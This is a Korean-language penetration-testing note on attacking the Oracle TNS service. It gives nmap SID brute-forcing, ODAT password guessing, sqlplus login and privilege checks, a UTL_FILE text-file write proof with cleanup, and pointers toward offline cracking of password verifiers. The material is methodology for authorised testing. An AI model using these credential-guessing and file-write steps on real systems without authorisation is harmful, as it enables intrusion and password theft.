---
tags:
  - 서비스/oracle
대표포트:
  - "T:1521"
서비스:
  - Oracle TNS
  - Oracle Database
---

# Oracle TNS 서비스

## 발견 시 판단

현재 명령 실행 호스트에서 `<TARGET>:1521`의 Oracle Transparent Network Substrate(TNS) listener에 도달할 수 있고, 아직 유효한 System Identifier(SID)·service name·DB 계정은 확인하지 않은 상태에서 시작한다. 접속 식별자를 확정한 뒤 계정 인증, 일반 DB role, `sysdba`, 계정 상태·verifier 버전 메타데이터, `UTL_FILE` 파일 쓰기를 서로 다른 권한 상태로 판단한다.

성공하면 로그인 계정이 읽을 수 있는 DB 객체와 role을 얻는다. `ORA-12505`·`ORA-12514`는 SID/service name과 listener 등록을, `ORA-01017`은 사용자·비밀번호와 인증 방식을, query·파일 작업 거부는 DB privilege와 directory object를 다시 확인한다. 파일 생성에는 `UTL_FILE` 실행 권한, writable Oracle directory object와 서버 파일 시스템 권한이 모두 필요하며, DB client·server path·OS Identity·웹 handler 경계는 [[DB 서버 측 작업의 실행 주체와 결과 경계]]를 따른다.

## 서비스 고유 확인

| 우선순위 | 현재 가진 정보로 확인할 것 | 도구 | 확인 출력과 다음 판단 |
|---|---|---|---|
| 1 | SID | `nmap -p1521 -sV <TARGET> --script oracle-sid-brute` | 유효 SID 또는 service name 후보를 확인한다. |
| 2 | 계정 후보 | [[원격 비밀번호 공격]]에서 `odat passwordguesser -s <TARGET> -d <SID>` 실행 | 유효 계정을 확인하고 반복 인증 정책을 고려한다. |
| 3 | DB 로그인 | `sqlplus <USER>/<PASSWORD>@<TARGET>/<SID>` | SQL prompt 접근 여부를 확인한다. |
| 4 | DB identity·role·system privilege | `select user from dual;`, `select * from user_role_privs;`, `select * from session_privs;` | 접속 성공, 부여 role와 현 session에 유효한 system privilege를 구분한다. |

### 선택적 UTL_FILE 텍스트 쓰기 proof

이미 존재하는 writable DIRECTORY object와 해당 object의 `WRITE` 권한, Oracle 서비스 계정의 서버 파일 시스템 쓰기 권한을 확인한 경우에만 고유한 텍스트 파일 하나를 만든다. ODAT `utlfile --putFile`은 절대 경로를 받아 `ODATPREFIX...` DIRECTORY object를 생성하고 `PUBLIC`에 `READ,WRITE`를 부여한 뒤 drop하는 구현이므로, 파일 하나만 생성하는 이 proof에서는 사용하지 않는다.

먼저 object의 서버 경로와 현 계정의 권한을 확인한다.

`<DIRECTORY_OBJECT>`는 현재 로그인 계정이 `READ`·`WRITE` 권한을 가진 Oracle DIRECTORY 이름(예: `APP_EXPORT_DIR`)이고, `<UNIQUE_FILE>`은 그 서버 경로에 새로 만들 파일명(예: `oracle-proof-20260914.txt`)이다. `<UNIQUE_ID>`는 파일 본문에서 재조회할 고유 문자열(예: `oracle-proof-20260914`)이며, `<WEB_HOST>`는 그 DIRECTORY 경로를 제공한다고 별도로 확인한 웹 호스트 FQDN(예: `files.example.test`)이다. SQL·PL/SQL은 Oracle DB 세션에서, `curl`은 현재 명령 실행 호스트에서 수행한다.

```sql
SELECT directory_name, directory_path
FROM all_directories
WHERE directory_name = '<DIRECTORY_OBJECT>';

SELECT grantee, privilege
FROM user_tab_privs
WHERE table_name = '<DIRECTORY_OBJECT>' AND privilege IN ('READ', 'WRITE');
```

동일 파일명이 없음을 먼저 확인한다. `FALSE` 일 때만 다음 쓰기로 진행한다.

```sql
SET SERVEROUTPUT ON;
DECLARE
  file_exists BOOLEAN;
  file_length NUMBER;
  block_size NUMBER;
BEGIN
  UTL_FILE.FGETATTR('<DIRECTORY_OBJECT>', '<UNIQUE_FILE>', file_exists, file_length, block_size);
  DBMS_OUTPUT.PUT_LINE(CASE WHEN file_exists THEN 'TRUE' ELSE 'FALSE' END);
END;
/
```

```sql
DECLARE
  proof_file UTL_FILE.FILE_TYPE;
BEGIN
  proof_file := UTL_FILE.FOPEN('<DIRECTORY_OBJECT>', '<UNIQUE_FILE>', 'w');
  UTL_FILE.PUT_LINE(proof_file, 'oracle-file-write-proof-<UNIQUE_ID>');
  UTL_FILE.FCLOSE(proof_file);
END;
/
```

웹 루트와 정적 파일 mapping이 따로 확인된 경우에만 공격 호스트에서 조회한다.

```bash
curl -fsS 'http://<WEB_HOST>/<UNIQUE_FILE>'
```

- PL/SQL block 성공은 Oracle 서비스 계정의 파일 쓰기만 의미한다. HTTP에서 고유 문자열을 받아야 웹에서 제공되는 경로를 확인한 것이다.
- `ORA-29280`·`ORA-29283`이면 DIRECTORY object 이름·경로·object privilege·OS 권한을 먼저 확인한다. HTTP `404`·`403`은 웹 경로 불일치·접근 제어일 수 있다.
- 확인 후 이번 proof의 exact 파일만 제거하고 존재 여부를 다시 확인한다.

```sql
BEGIN
  UTL_FILE.FREMOVE('<DIRECTORY_OBJECT>', '<UNIQUE_FILE>');
END;
/
```

정리 후 위 `FGETATTR` block을 다시 실행해 `FALSE`를 확인한다. 세션이 먼저 끊기거나 제거가 거부되면 파일 정리를 완료했다고 기록하지 않는다.

## 단서별 다음 경로

| 관찰 단서·현재 권한 | 지금 가능한 기법 | 도구 | 성공 결과 |
|---|---|---|---|
| SID 또는 service name 필요 | [[Oracle TNS SID 열거]] | `odat`, `nmap` | 로그인할 Oracle 인스턴스 식별자 |
| 기본 계정 또는 확보한 사용자 이름·비밀번호 후보 | [[원격 비밀번호 공격]] | `sqlplus`, `odat` | 계정 인증 성공 여부 |
| DB 로그인·role 확보 | [[DB 인증과 데이터 열거]] | `sqlplus`, `odat` | 접근 가능한 테이블·view·사용자 정보 |
| DBA view 조회 권한 | [[DB 인증과 데이터 열거]] | `sqlplus` | 계정 상태·인증 방식·verifier 버전 메타데이터; verifier 본문은 미확보 |
| Oracle 8i~10g server release 또는 11g~12c account별 verifier version과 `SYS.USER$` 직접 조회 권한 | [[Oracle password verifier 추출과 오프라인 입력 준비]] | `sqlplus`, `hashcat` | 10G·11G·12C component별 오프라인 입력과 평문 후보 |
| `UTL_FILE` 실행 권한과 writable DIRECTORY object | 이 문서의 선택적 UTL_FILE 텍스트 쓰기 proof | `sqlplus`, `curl` | writable directory의 파일 생성과 별도 웹 접근 여부 |

## 서비스 고유 주의 사항

- SID 또는 service name이 맞지 않으면 유효 credential도 접속에 실패할 수 있다.
- Oracle 버전별 기본 계정 정책이 다르며 일반 DB role과 `sysdba`를 구분한다.
- 계정 메타데이터 조회와 verifier 본문 획득, 파일 쓰기는 각각 별도의 DB·OS 권한이 필요하다.
- 파일 생성과 웹 실행은 별도 상태이며 웹 서버 경로까지 일치해야 한다.

## 참고 링크

- [Oracle Database 19c: UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html)
- [Oracle Database 19c: USER_ROLE_PRIVS](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/USER_ROLE_PRIVS.html)
- [Oracle Database 19c: SESSION_PRIVS](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/SESSION_PRIVS.html)
- [ODAT `utlfile` 구현](https://github.com/quentinhardy/odat/blob/master-python3/UtlFile.py)
